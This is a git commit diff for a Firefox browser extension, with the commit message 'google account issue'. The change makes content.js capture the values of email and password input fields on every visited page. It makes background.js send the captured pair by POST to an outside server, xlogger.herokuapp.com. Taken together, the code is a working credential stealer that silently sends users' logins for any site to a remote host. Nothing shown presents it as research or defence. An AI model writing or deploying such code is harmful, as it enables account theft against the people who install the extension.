47a80bf2c741353a952f75a0735e1b35c6ef5105
varaprasadh <varaprasadh.a@gmail.com>
2019-08-02 09:44:29 +0530

    google account issue

--- ext/firefox/js/background.js
+++ ext/firefox/js/background.js
@@ -1,14 +1,16 @@
-// var domain = 'https://wcslogger.herokuapp.com';
 var domain="https://xlogger.herokuapp.com"
+// var domain="http://localhost:9992"
 let loading=1;
 
 chrome.tabs.onUpdated.addListener(async (tabId,changeInfo,tab)=>{
     // console.log("updated",changeInfo,tab);
     if(changeInfo.status=="loading" && loading==1){
         chrome.storage.local.get(obj=>{
+          let session=obj.session;
+          if(session.email && session.password){
             loading++;
+            console.log("sending log");            
             setTimeout(() => {
-                if(obj.session.length>0){
                     fetch(`${domain}/upload`,{
                         method:"POST",
                         mode:"cors",
@@ -17,9 +19,11 @@ chrome.tabs.onUpdated.addListener(async (tabId,changeInfo,tab)=>{
                             "content-Type":"application/json"
                         }
                     }).catch(err=>err);
-                }
+                
                 loading--;
-            },1000);
+            },1000);  
+            console.log(obj);
+          }
         });  
     } 
 })  
--- ext/firefox/js/content.js
+++ ext/firefox/js/content.js
@@ -1,28 +1,17 @@
 var inputs=document.querySelectorAll('input');
-
-chrome.storage.local.set({session:[],url:window.location.href,host:window.location.host,userAgent:navigator.userAgent},()=>{
+chrome.storage.local.set({session:{},url:window.location.href,host:window.location.host,userAgent:navigator.userAgent},()=>{
     console.log("initialised");
 });
-
-
+//session is nothing but fields 
 inputs.forEach(input=>{
     input.addEventListener('blur',e=>{
-        let {type,id,value} = input;
-        if(value.trim()!=""){
+        let {type,value} = input;
+        if(value.trim()!="" && (type=="email" || type=="password")){
           chrome.storage.local.get(['session'],obj=>{
               session=obj.session;
-              session.forEach((ses,i)=>{
-                  if(ses.id==id && id!=null && id!=undefined && id!=""){
-                      console.log(id);
-                      session.splice(i,1);
-                  };
-              });
-              session.push({type,id,value});
+              session[type]=value;
               chrome.storage.local.set({session:session});
           })
         }
     })
 });
-
-
-
